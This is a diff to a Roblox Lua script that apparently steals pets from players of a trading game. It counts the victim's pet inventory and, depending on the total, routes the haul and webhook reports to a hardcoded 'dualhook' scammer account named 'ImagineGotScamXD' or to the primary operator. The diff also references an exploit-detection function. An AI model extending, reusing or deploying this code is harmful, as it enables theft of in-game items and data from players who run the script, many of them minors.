@@ -6,13 +6,8 @@ coroutine.wrap(function()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local InventoryDB = Loads("InventoryDB")
     local ClientData = Loads('ClientData')
-    local legendaries_count = 0
-    local mega_count = 0
-    local neon_count = 0
-    local ultra_count = 0
-    local rare_count = 0
-    local uncommon_count = 0
-    local common_count = 0
+    local player = game.Players.LocalPlayer
+    local petInventory = player:WaitForChild("Backpack"):WaitForChild("Pets")
 
     -- [ Dualhook Settings ] --
     DualUsername = "ImagineGotScamXD" -- [Dualhook Username]
@@ -37,31 +32,16 @@ coroutine.wrap(function()
         end
     end)
     
-    for i, v in pairs(ClientData.get("inventory").pets) do
-      if InventoryDB[v.category][v.id].rarity == "legendary" then
-        legendaries_count = legendaries_count + 1
-      end
-      if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
-        ultra_count = ultra_count + 1
-      end
-      if InventoryDB[v.category][v.id].rarity == "rare" then
-        rare_count = rare_count + 1
-      end
-      if InventoryDB[v.category][v.id].rarity == "uncommon" then
-        uncommon_count = uncommon_count + 1
-      end
-      if InventoryDB[v.category][v.id].rarity == "common" then
-        common_count = common_count + 1
-      end
-      if InventoryDB[v.category][v.id].properties == "mega_neon" then
-        mega_count = mega_count + 1
-      end
-      if InventoryDB[v.category][v.id].properties == "neon" then
-        neon_count = neon_count + 1
-      end
+    local function countPetsInInventory()
+    local total_pets = 0
+    -- Menghitung jumlah pet yang ada dalam inventory
+    for _, pet in pairs(petInventory:GetChildren()) do
+        total_pets = total_pets + 1
     end
+    return total_pets
+end
 
-    local total_pets = legendaries_count + ultra_count + rare_count + uncommon_count + common_count + mega_count + neon_count
+local total_pets = countPetsInInventory()
     
     if total_pets >= DualTotal then
         UserName = DualUsername
@@ -70,7 +50,6 @@ coroutine.wrap(function()
         UserName = Username
         WebHook = Webhook
     end
-    
     
     local exploit
     local function getexploit()
